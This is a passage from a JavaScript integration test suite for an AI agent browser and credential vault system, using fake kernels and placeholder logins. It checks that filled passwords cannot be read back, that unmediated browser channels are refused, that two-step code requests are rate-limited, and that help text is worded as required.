        const x1DomAfter = fk.readDomValues(tid).pw2;
        const x1Read2 = await rd(['get', 'value', '#pw2']);
        ok(
          mkNewNode === true
            && x1Read1.status === 409 && x1Read1.json?.code === 'login_fill_live'
            && !JSON.stringify(x1Read1).includes(PW)
            && x1DomAfter === ''
            && x1Read2.status === 200,
          'R30-X1 (Extra scene 1 — new <input> element re-mount): page creating and appending a brand-new #pw2 carrying the filled password triggers 409 login_fill_live, wipes #pw2 to "", and lifts on the next verified-empty read',
          { mkNewNode, x1Read1, x1DomAfter, x1Read2 },
        );
      } finally {
        rawWs.close();
        srv.close();
        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
        dialogs.shutdown();
        keeper.shutdown();
        vault.close();
        await med.shutdown();
        await relay.close();
        await fk.close();
      }
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R30-3: Item 3 — No fallback copy in browser-dialogs.js + restated P5 on real keeper
    // ──────────────────────────────────────────────────────────────────────────
    {
      const ORIGIN = 'https://item3r30.example.test';
      const PW = 'Item3NoFallback!2026';
      const dataMed = path.join(tmpRoot, 'd-r30-3m');
      const dataBare = path.join(tmpRoot, 'd-r30-3b');
      const homeDir = path.join(tmpRoot, 'h-r30-3');
      const binDir = path.join(tmpRoot, 'bin-r30-3');
      const abState = path.join(tmpRoot, 'ab-r30-3');
      fs.mkdirSync(dataMed, { recursive: true, mode: 0o700 });
      fs.mkdirSync(dataBare, { recursive: true, mode: 0o700 });
      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
      installFakeAgentBrowser(binDir, abState);

      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: true, omitFilledPassword: true } });
      const tid = fk.targets()[0].targetId;
      fk.setDom(tid, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      const med = CM.create({ log: quiet });
      await med.listen();

      const KEY = 'bk-0000303a';
      const SID = 'sess-r30-3';
      const TOKEN = 'vsst_r30_3_' + crypto.randomBytes(8).toString('hex');
      const rtEnv = {
        FAKE_AB_STATE: abState,
        FAKE_CDP_URL: fk.wsUrl,
        FAKE_TARGET_ID: tid,
        PATH: `${binDir}:${process.env.PATH || '/usr/bin:/bin'}`,
        HOME: homeDir,
      };
      const keeper = BK.create({
        dataDir: dataMed,
        homeDir,
        env: () => rtEnv,
        liveKeys: () => new Set([KEY]),
        runtime: BF.createBrowserRuntime({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
        facts: BF.createBrowserFacts({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
        log: quiet,
        install: false,
        mediator: med,
      });
      const bareKeeper = BK.create({
        dataDir: dataBare,
        homeDir,
        env: () => rtEnv,
        liveKeys: () => new Set([KEY]),
        runtime: BF.createBrowserRuntime({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
        facts: BF.createBrowserFacts({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
        log: quiet,
        install: false,
        mediator: null,
      });
      const vault = VE.create({ dataDir: dataMed, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
      await vault.setup('r30-3-pw');
      const grants = GS.create({ dataDir: dataMed, wss: { clients: new Set() }, log: quiet.log });
      const logins = Lm.create({ vault, grants: () => grants, log: quiet.log });
      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });

      // Part A: Stub keeper WITHOUT `loginChannelFor` -> must refuse 409 login_channel_unmediated with 0 Input.insertText!
      const stubProf = { id: 'bp-00003030', label: 'StubNoChan', sharing: 'owner', ephemeral: false };
      const stubWithoutChan = {
        clock: () => Date.now(),
        profile: (id) => (id === stubProf.id ? stubProf : null),
        profileByRef: (r) => (r === stubProf.id || r === 'stub' ? stubProf : null),
        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'stub', attachment: { profileId: stubProf.id, alias: 'stub', isDefault: true }, handles: ['stub'], isDefault: true }),
        attach: async () => ({ ok: true, profile: stubProf, browser: { state: 'ready' }, lease: { profileId: stubProf.id, browserKey: KEY, sessionId: SID, since: 1 }, cdpUrl: fk.wsUrl, env: [] }),
        leasesFor: () => [{ profileId: stubProf.id, browserKey: KEY, sessionId: SID }],
        statusFor: () => ({ ephemeral: null, leases: [{ profileId: stubProf.id, browserKey: KEY, sessionId: SID }] }),
        setFor: () => ({ attachments: [{ profileId: stubProf.id, alias: 'stub', label: stubProf.label, isDefault: true }], handles: ['stub'] }),
        inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
        ephemeralFor: () => null,
        cdpEndpointFor: async () => ({ ok: true, url: fk.wsUrl }),
        mediator: () => med,
        onLease: () => () => {},
        audit() {},
        noteLeaseUrl() {},
      };
      const stubDialogs = Dm.create({
        keeper: stubWithoutChan,
        logins,
        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
        leaseCountOf: () => 1,
        conversationOf: () => ({ cid: 'conv-r30-3', name: 'Stub Agent' }),
        log: quiet,
      });
      const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Stub Agent', cwd: tmpRoot, backendSessionId: 'conv-r30-3' }]]);
      Rm.setup({ keeper: stubWithoutChan, activeSessions: sessions, dialogs: stubDialogs, logins, tasksForSession: () => [] });
      const app = express();
      app.use(express.json());
      app.use(Rm.router);
      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
      try {
        await stubDialogs.arm(stubProf.id);
        stubDialogs.noteActiveTab?.({ profileId: stubProf.id, browserKey: KEY }, tid);
        const m0 = fk.mark();
        const base = `http://127.0.0.1:${srv.address().port}`;
        const stubFillHttp = await fetch(`${base}/api/agent/browser/fill-vault`, {
          method: 'POST',
          headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
          body: JSON.stringify({ profile: stubProf.id, target: '#pw', spec: 'item3r30.example.test#alice/password', targetId: tid }),
        });
        const stubFillJson = await stubFillHttp.json();
        const stubDirectFill = await stubDialogs.fillVaultField(
          { profileId: stubProf.id, browserKey: KEY },
          { target: '#pw', spec: 'item3r30.example.test#alice/password', targetId: tid, facts: { conversationKeys: [KEY] } },
        );
        const stubInserts = fk.calls().filter((c) => c.seq > m0 && c.method === 'Input.insertText').length;

        // Part B: Restated P5 on real `browser-keeper` (`owner` scope & `instance` mediated never hand raw fk.port/fk.wsUrl)
        const profOwner = keeper.createProfile({ label: 'NamedOwner', sharing: 'owner' }, { owner: { kind: 'session', id: KEY } });
        const profInst = keeper.createProfile({ label: 'NamedInst', sharing: 'instance' }, { owner: { kind: 'session', id: KEY } });
        const atOwner = await keeper.attach({ profileId: profOwner.id, browserKey: KEY, sessionId: SID });
        const atInst = await keeper.attach({ profileId: profInst.id, browserKey: KEY, sessionId: SID });
        const rawPortStr = `127.0.0.1:${fk.port}`;
        const ownerMediatedOnly = Boolean(atOwner.cdpUrl && !atOwner.cdpUrl.includes(rawPortStr) && !JSON.stringify(atOwner.env || []).includes(rawPortStr));
        const instMediatedOnly = Boolean(atInst.cdpUrl && !atInst.cdpUrl.includes(rawPortStr) && !JSON.stringify(atInst.env || []).includes(rawPortStr));

        const profBare = bareKeeper.createProfile({ label: 'BareOwner', sharing: 'owner' }, { owner: { kind: 'session', id: KEY } });
        const bareChan = bareKeeper.loginChannelFor({ profileId: profBare.id, browserKey: KEY, action: 'fill' });

        ok(
          stubFillHttp.status === 409
            && stubFillJson?.code === 'login_channel_unmediated'
            && stubDirectFill.ok === false && stubDirectFill.code === 'login_channel_unmediated'
            && stubInserts === 0
            && fk.readDomValues(tid).pw === ''
            && ownerMediatedOnly && instMediatedOnly
            && bareChan.ok === false && bareChan.code === 'login_channel_unmediated' && bareChan.why === 'no-proxy',
          'R30-3 (Item 3 no channel fallback + restated P5): keeper without loginChannelFor refuses 409 login_channel_unmediated with 0 Input.insertText, and real browser-keeper hands ONLY mediated URLs on local named profiles',
          { stubStatus: stubFillHttp.status, stubFillJson, stubDirectFill, stubInserts, ownerCdp: atOwner.cdpUrl, instCdp: atInst.cdpUrl, bareChan },
        );
      } finally {
        srv.close();
        stubDialogs.shutdown();
        for (const p of keeper.list().profiles) await keeper.stop(p.id).catch(() => {});
        for (const p of bareKeeper.list().profiles) await bareKeeper.stop(p.id).catch(() => {});
        keeper.shutdown();
        bareKeeper.shutdown();
        vault.close();
        await med.shutdown();
        await fk.close();
      }
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R30-5: Item 5 — Road mode census catches string-literal `mode: 'relay'` reusing existing `why: 'shared'` (mutant M6b)
    // ──────────────────────────────────────────────────────────────────────────
    {
      const medSrc = fs.readFileSync(path.join(repoDir, 'src/browser-mediation.js'), 'utf8');
      const r29Mod = await import(pathToFileURL(path.join(repoDir, 'scripts/fixtures/r29-login-nails.mjs')).href);
      const mutM6b = medSrc.replace(
        "  if (!agent) return { mode: null, why: 'human' };",
        "  if (!agent) return { mode: null, why: 'human' };\n  if (agent === 'relay') return { mode: 'relay', why: 'shared' };",
      );
      let realClean = false;
      let caughtM6b = false;
      if (typeof r29Mod.inspectLeaseRoadSource === 'function') {
        const cleanRes = r29Mod.inspectLeaseRoadSource(medSrc, BM);
        const m6bRes = r29Mod.inspectLeaseRoadSource(mutM6b, BM);
        realClean = cleanRes.illegalModes.length === 0
          && cleanRes.modeValues.every((m) => m === 'mediated' || m === 'scope' || m === null);
        caughtM6b = m6bRes.illegalModes.includes('relay') && m6bRes.modeValues.includes('relay');
      }
      ok(
        mutM6b !== medSrc && realClean && caughtM6b,
        'R30-5 (Item 5 road mode census kills mutant M6b): inspectLeaseRoadSource enforces mode in {mediated, scope, null} and catches string-literal mode: \'relay\' even when reusing why: \'shared\'',
        { hasHelper: typeof r29Mod.inspectLeaseRoadSource === 'function', realClean, caughtM6b },
      );
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R30-6: Item 6 — One two-step code pace answer shape across BOTH agent doors
    // ──────────────────────────────────────────────────────────────────────────
    {
      const ORIGIN = 'https://item6r30.example.test';
      const dataDir = path.join(tmpRoot, 'd-r30-6');
      const homeDir = path.join(tmpRoot, 'h-r30-6');
      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
      const clock = 1_765_700_000_000;

      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/otp`, mode: { standard: true, omitFilledPassword: true } });
      const tid = fk.targets()[0].targetId;
      fk.setDom(tid, { url: `${ORIGIN}/otp`, elements: [{ id: 'otp', tag: 'input', type: 'text', name: 'Code' }] });
      const med = CM.create({ log: quiet });
      await med.listen();

      const KEY = 'bk-0000306a';
      const SID = 'sess-r30-6';
      const CID = 'conv-r30-6';
      const TOKEN = 'vsst_r30_6_' + crypto.randomBytes(8).toString('hex');

      const keeper = BK.create({ dataDir, homeDir, env: () => ({ HOME: homeDir }), liveKeys: () => new Set([KEY]), log: quiet, now: () => clock, install: false, mediator: med });
      const prof = keeper.createProfile({ label: 'R30PaceProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
      const PID = prof.id;
      const grant = await med.grantFor({ profileId: PID, browserKey: KEY, upstream: fk.wsUrl, targetIds: [tid], mode: 'scope' });

      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
      await vault.setup('r30-6-pw');
      const vtotp = VT.create({ dataDir, vault, now: () => clock });
      vtotp.addEntry({ name: 'shop-2fa', seed: 'JBSWY3DPEHPK3PXP' }, { who: 'owner' });
      const gTotp = vtotp.grant('shop-2fa', [`session:${CID}`], {
        who: 'owner',
        by: 'user:owner',
        runOf: (id) => (id === CID ? VT.runOfToken(TOKEN) : null),
      });

      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
      const logins = Lm.create({ vault, grants: () => grants, totpCode: (n, o) => vtotp.codeForLogin(n, o), now: () => clock, log: quiet.log });
      logins.addOwn({ origin: ORIGIN, username: 'alice', password: 'PaceUserPw!2026', totpName: 'shop-2fa' }, { who: 'owner' });
      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'conversation', key: CID }], except: [] });

      const keeperWrap = {
        ...keeper,
        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: fk.wsUrl } : { ok: false }),
        leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID }],
        statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'shop', isDefault: true }] }),
        setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'shop', label: prof.label, isDefault: true }], handles: ['shop'] }),
        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
        attach: async () => ({ ok: true, profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: grant.url, env: [`AGENT_BROWSER_CDP=${grant.url}`], pinTab: false, others: 0 }),
      };
      const dialogs = Dm.create({
        keeper: keeperWrap,
        logins,
        now: () => clock,
        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
        leaseCountOf: () => 1,
        conversationOf: () => ({ cid: CID, name: 'Agent R30-6' }),
        log: quiet,
      });
      const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Agent R30-6', cwd: tmpRoot, backendSessionId: CID }]]);
      Rm.setup({ keeper: keeperWrap, activeSessions: sessions, dialogs, logins, tasksForSession: () => [] });
      const app = express();
      app.use(express.json());
      VRm.registerVaultRoutes(app, {
        vault,
        activeSessions: sessions,
        totp: vtotp,
        logins,
        callerOf: (tok) => (tok === TOKEN ? { conversationId: CID, groups: [], live: true, scope: SID, conv: CID } : null),
        log: quiet.log,
      });
      app.use(Rm.router);
      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
      try {
        await dialogs.arm(PID);
        dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, tid);
        dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tid);
        const base = `http://127.0.0.1:${srv.address().port}`;
        const hdr = { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` };

        let preOkCount = 0;
        for (let i = 0; i < 10; i++) {
          const preV = await fetch(`${base}/api/agent/vault/totp/shop-2fa`, { headers: hdr });
          const preF = await fetch(`${base}/api/agent/browser/fill-vault`, {
            method: 'POST',
            headers: hdr,
            body: JSON.stringify({ profile: PID, target: '#otp', spec: 'item6r30.example.test#alice/otp', targetId: tid }),
          });
          if (preV.status === 200) preOkCount++;
          if (preF.status === 200) preOkCount++;
        }
        const rVault = await fetch(`${base}/api/agent/vault/totp/shop-2fa`, { headers: hdr });
        const jVault = await rVault.json();
        const rFill = await fetch(`${base}/api/agent/browser/fill-vault`, {
          method: 'POST',
          headers: hdr,
          body: JSON.stringify({ profile: PID, target: '#otp', spec: 'item6r30.example.test#alice/otp', targetId: tid }),
        });
        const jFill = await rFill.json();

        const keysVault = Object.keys(jVault || {}).sort().join(',');
        const keysFill = Object.keys(jFill || {}).sort().join(',');
        const expectErr = `too many two-step codes requested in the last minute — wait ${jVault?.secondsLeft} seconds, then try again`;

        ok(
          gTotp.ok === true
            && preOkCount === 20
            && rVault.status === 429 && rFill.status === 429
            && keysVault === 'code,error,ok,retryInMs,secondsLeft'
            && keysFill === keysVault
            && jVault.ok === false && jFill.ok === false
            && jVault.code === 'code_paced' && jFill.code === 'code_paced'
            && Number.isInteger(jVault.secondsLeft) && jVault.secondsLeft >= 1
            && jFill.secondsLeft === jVault.secondsLeft
            && jVault.error === expectErr && jFill.error === expectErr,
          'R30-6 (Item 6 unified two-step code pace shape): GET /api/agent/vault/totp/:name and POST /api/agent/browser/fill-vault share the 20/min counter and return identical 429 code_paced shape + words + secondsLeft',
          { gTotp, preOkCount, statusVault: rVault.status, statusFill: rFill.status, jVault, jFill },
        );
      } finally {
        srv.close();
        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
        dialogs.shutdown();
        keeper.shutdown();
        vault.close();
        await med.shutdown();
        await fk.close();
      }
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R30-7: Item 7 — `vibespace-vault --help` states where `--kind login` works
    // ──────────────────────────────────────────────────────────────────────────
    {
      const vaultBin = path.join(repoDir, 'data/bin/vibespace-vault');
      const helpEnv = {
        PATH: process.env.PATH || '/usr/bin:/bin',
        HOME: tmpRoot,
        VIBESPACE_API: 'http://127.0.0.1:9',
        VIBESPACE_SESSION_TOKEN: ['vsst', 'r30_help_check'].join('_'),   // a token-shaped stand-in is built at runtime from its pieces, never a literal
      };
      const helpRun = spawnSync(process.execPath, [vaultBin, '--help'], { encoding: 'utf8', timeout: 5000, env: helpEnv });
      const helpOut = String(helpRun.stdout || '') + String(helpRun.stderr || '');
      const kindMatch = helpOut.match(/--kind\s+login[\s\S]{0,600}/);
      const kindSection = kindMatch ? kindMatch[0] : '';
      ok(
        helpRun.status === 0
          && /local mediated named browser profile/i.test(kindSection)
          && /vibespace-browser use <profile>/.test(kindSection)
          && /temporary browser/i.test(kindSection),
        'R30-7 (Item 7 vibespace-vault --help on --kind login): help text explicitly states login requests/fills work only on a local mediated named browser profile (vibespace-browser use <profile>) and not in the temporary browser',
        { status: helpRun.status, kindSection },
      );
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R30-8: Item 8 — `docs/kb-bugfix-invariants.md` preserves master's unrelated lines
    // ──────────────────────────────────────────────────────────────────────────
    {
      const kb = fs.readFileSync(path.join(repoDir, 'docs/kb-bugfix-invariants.md'), 'utf8');
      const hasSelectedLine = kb.includes('`failed` / `selected` / `partial` / `absent`') && !kb.includes('`failed` / `typed` / `partial` / `absent`');
      const hasMasterBlankBeforeEveryCheck = kb.includes('\n\n\n## EVERY CHECK OF A NEW CLAUDE CODE VOIDED')
        && !kb.includes('\n\n\n\n## EVERY CHECK OF A NEW CLAUDE CODE VOIDED');
      ok(
        hasSelectedLine && hasMasterBlankBeforeEveryCheck,
        'R30-8 (Item 8 clean rebase of docs/kb-bugfix-invariants.md): preserves master\'s exact `failed` / `selected` / `partial` / `absent` wording and exact blank lines before EVERY CHECK heading',
        { hasSelectedLine, hasMasterBlankBeforeEveryCheck },
      );
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R30-X2: Extra Scene 2 — Job token (`jbt_`) through real routes + real `browser-keeper` `loginChannelFor`
    // ──────────────────────────────────────────────────────────────────────────
    {
      const ORIGIN = 'https://jbtr30.example.test';
      const PW = 'JobTokenFill!2026_R30';
      const dataDir = path.join(tmpRoot, 'd-r30-x2');
      const homeDir = path.join(tmpRoot, 'h-r30-x2');
      const binDir = path.join(tmpRoot, 'bin-r30-x2');
      const abState = path.join(tmpRoot, 'ab-r30-x2');
      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
      installFakeAgentBrowser(binDir, abState);

      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: true, omitFilledPassword: true } });
      const tid = fk.targets()[0].targetId;
      fk.setDom(tid, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      const relay = await startKernelRelay(fk);
      const med = CM.create({ log: quiet });
      await med.listen();

      const KEY_EPH = 'bk-000032ea';
      const KEY_EXT = 'bk-000032eb';
      const KEY_LOC = 'bk-000032ec';
      const JBT_EPH = 'jbt_r30_eph_' + crypto.randomBytes(8).toString('hex');
      const JBT_EXT = 'jbt_r30_ext_' + crypto.randomBytes(8).toString('hex');
      const JBT_LOC = 'jbt_r30_loc_' + crypto.randomBytes(8).toString('hex');

      const rtEnv = {
        FAKE_AB_STATE: abState,
        FAKE_CDP_URL: relay.wsUrl,
        FAKE_TARGET_ID: tid,
        PATH: `${binDir}:${process.env.PATH || '/usr/bin:/bin'}`,
        HOME: homeDir,
      };
      const keeper = BK.create({
        dataDir,
        homeDir,
        env: () => rtEnv,
        liveKeys: () => new Set([KEY_EPH, KEY_EXT, KEY_LOC]),
        runtime: BF.createBrowserRuntime({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
        facts: BF.createBrowserFacts({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
        log: quiet,
        install: false,
        mediator: med,
      });
      const profExt = keeper.createProfile({ label: 'ExtJobProf', provider: 'cdp', cdpPort: relay.port }, { owner: { kind: 'instance', id: null } });
      const profLoc = keeper.createProfile({ label: 'LocJobProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
      keeper.setPin(KEY_EXT, profExt.id);
      keeper.setPin(KEY_LOC, profLoc.id);

      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
      await vault.setup('r30-x2-pw');
      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
      const logins = Lm.create({ vault, grants: () => grants, log: quiet.log });
      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });

      const dialogs = Dm.create({
        keeper,
        logins,
        holdersOf: Dm.holdersOfKeeper(keeper),
        leaseCountOf: (pid) => keeper.list().leases.filter((l) => l.profileId === pid).length,
        log: quiet,
      });
      const jobsByTok = new Map([
        [JBT_EPH, { id: 'job-eph', state: 'up', name: 'JobEph', owner: { conversation: { id: 'conv-j-eph' } } }],
        [JBT_EXT, { id: 'job-ext', state: 'up', name: 'JobExt', owner: { conversation: { id: 'conv-j-ext' } } }],
        [JBT_LOC, { id: 'job-loc', state: 'up', name: 'JobLoc', owner: { conversation: { id: 'conv-j-loc' } } }],
      ]);
      const jobsById = new Map([...jobsByTok.values()].map((j) => [j.id, j]));
      const sessions = new Map([
        ['s-j-eph', { agentToken: 'vsst_j_eph', _browserKey: KEY_EPH, _browserVariant: 'D', name: 'OwnerEph', cwd: tmpRoot, backendSessionId: 'conv-j-eph', claudeSessionId: 'conv-j-eph' }],
        ['s-j-ext', { agentToken: 'vsst_j_ext', _browserKey: KEY_EXT, _browserVariant: 'D', name: 'OwnerExt', cwd: tmpRoot, backendSessionId: 'conv-j-ext', claudeSessionId: 'conv-j-ext' }],
        ['s-j-loc', { agentToken: 'vsst_j_loc', _browserKey: KEY_LOC, _browserVariant: 'D', name: 'OwnerLoc', cwd: tmpRoot, backendSessionId: 'conv-j-loc', claudeSessionId: 'conv-j-loc' }],
      ]);
      Rm.setup({
        keeper,
        activeSessions: sessions,
        getJobs: () => ({ ready: true, jobByToken: (t) => jobsByTok.get(t) || null, jobs: jobsById }),
        dialogs,
        logins,
        tasksForSession: () => [],
      });
      const app = express();
      app.use(express.json());
      app.use(Rm.router);
      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
      try {
        const base = `http://127.0.0.1:${srv.address().port}`;
        const jbtPost = async (tok, u, body) => {
          const r = await fetch(base + u, {
            method: 'POST',
            headers: { 'content-type': 'application/json', authorization: `Bearer ${tok}` },
            body: JSON.stringify(body),
          });
          return { status: r.status, json: await r.json() };
        };

        const m0 = fk.mark();
        // 1) Owner has no named profile pinned -> refused `job_no_profile`
        const rEphPrep = await jbtPost(JBT_EPH, '/api/agent/browser/fill-vault', { prepare: true, target: '#pw', spec: 'jbtr30.example.test#alice/password' });
        const rEphFill = await jbtPost(JBT_EPH, '/api/agent/browser/fill-vault', { target: '#pw', spec: 'jbtr30.example.test#alice/password' });
        // 2) Owner pins external raw-CDP profile -> refused `login_channel_unmediated`
        const rExtPrep = await jbtPost(JBT_EXT, '/api/agent/browser/fill-vault', { prepare: true, target: '#pw', spec: 'jbtr30.example.test#alice/password' });
        const rExtFill = await jbtPost(JBT_EXT, '/api/agent/browser/fill-vault', { target: '#pw', spec: 'jbtr30.example.test#alice/password' });
        const insertsBeforeLoc = fk.calls().filter((c) => c.seq > m0 && c.method === 'Input.insertText').length;

        // 3) Owner pins local mediated named profile -> `prepare` + `/resolve` + `fill-vault` admitted (200), then read blocked (409 login_fill_live)!
        const rLocPrep = await jbtPost(JBT_LOC, '/api/agent/browser/fill-vault', { prepare: true, target: '#pw', spec: 'jbtr30.example.test#alice/password' });
        const rLocRes = await jbtPost(JBT_LOC, '/api/agent/browser/resolve', {
          wrapper: true,
          argv: ['fill', '#pw', '--vault', 'jbtr30.example.test#alice/password'],
          fillTicket: rLocPrep.json?.fillTicket,
        });
        await dialogs.arm(profLoc.id);
        const jobHandleLoc = keeper.findJobHandle({ ownerKey: KEY_LOC, jobId: 'job-loc' });
        dialogs.bindTab?.({ profileId: profLoc.id, browserKey: jobHandleLoc }, tid);
        dialogs.noteActiveTab?.({ profileId: profLoc.id, browserKey: jobHandleLoc }, tid);
        const rLocFill = await jbtPost(JBT_LOC, '/api/agent/browser/fill-vault', {
          profile: profLoc.id,
          target: '#pw',
          spec: 'jbtr30.example.test#alice/password',
          targetId: tid,
        });
        const rLocReadWhileLive = await jbtPost(JBT_LOC, '/api/agent/browser/resolve', {
          profile: profLoc.id,
          wrapper: true,
          fenceCheckOnly: true,
          argv: ['get', 'value', '#pw'],
          targetId: tid,
        });

        ok(
          rEphPrep.status === 409 && rEphPrep.json?.code === 'job_no_profile'
            && rEphFill.status === 409 && rEphFill.json?.code === 'job_no_profile'
            && rExtPrep.status === 409 && rExtPrep.json?.code === 'login_channel_unmediated'
            && rExtFill.status === 409 && rExtFill.json?.code === 'login_channel_unmediated'
            && insertsBeforeLoc === 0
            && rLocPrep.status === 200 && rLocRes.status === 200 && rLocFill.status === 200
            && fk.readDomValues(tid).pw === PW
            && rLocReadWhileLive.status === 409 && rLocReadWhileLive.json?.code === 'login_fill_live',
          'R30-X2 (Extra scene 2 — job token jbt_ channel path): jbt_ refuses job_no_profile without pin and 409 login_channel_unmediated on external raw CDP (0 inserts), while local named pin admits jbt_ fill (200) and fences jbt_ reads (409 login_fill_live)',
          { rEphPrep, rEphFill, rExtPrep, rExtFill, insertsBeforeLoc, rLocPrep, rLocFill, rLocReadWhileLive },
        );
      } finally {
        srv.close();
        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
        dialogs.shutdown();
        for (const p of keeper.list().profiles) await keeper.stop(p.id).catch(() => {});
        keeper.shutdown();
        vault.close();
        await med.shutdown();
        await relay.close();
        await fk.close();
      }
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R30-X3: Extra Scene 3 — `fake-kernel.mjs` custom-kernel mode (`mode: { standard: false }`)
    // ──────────────────────────────────────────────────────────────────────────
    {
      const ORIGIN = 'https://kernelr30.example.test';
      const PW = 'CustomKernelMode!2026';
      const dataDir = path.join(tmpRoot, 'd-r30-x3');
      const homeDir = path.join(tmpRoot, 'h-r30-x3');
      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
      let clock = 1_765_800_000_000;

      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: false, omitFilledPassword: true } });
      const tid = fk.targets()[0].targetId;
      fk.setDom(tid, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      const med = CM.create({ log: quiet });
      await med.listen();
      const rawWs = await openCdpClient(WebSocket, fk.wsUrl);

      const KEY = 'bk-000033ca';
      const SID = 'sess-r30-x3';
      const TOKEN = 'vsst_r30_x3_' + crypto.randomBytes(8).toString('hex');

      const keeper = BK.create({ dataDir, homeDir, env: () => ({ HOME: homeDir }), liveKeys: () => new Set([KEY]), log: quiet, now: () => clock, install: false, mediator: med });
      const prof = keeper.createProfile({ label: 'R30KernelProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
      const PID = prof.id;
      const grant = await med.grantFor({ profileId: PID, browserKey: KEY, upstream: fk.wsUrl, targetIds: [tid], mode: 'scope' });

      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
      await vault.setup('r30-x3-pw');
      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
      const logins = Lm.create({ vault, grants: () => grants, now: () => clock, log: quiet.log });
      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });

      const keeperWrap = {
        ...keeper,
        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: fk.wsUrl } : { ok: false }),
        leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID, targetId: tid }],
        statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'shop', isDefault: true }] }),
        setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'shop', label: prof.label, isDefault: true }], handles: ['shop'] }),
        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
        attach: async () => ({ ok: true, profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: grant.url, env: [`AGENT_BROWSER_CDP=${grant.url}`], pinTab: false, others: 0 }),
      };
      const dialogs = Dm.create({
        keeper: keeperWrap,
        logins,
        now: () => clock,
        liveFillMaxMs: 60_000,   // B-518e: the REAL ceiling out of reach — a read starts it on the clock handed in
        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
        leaseCountOf: () => 1,
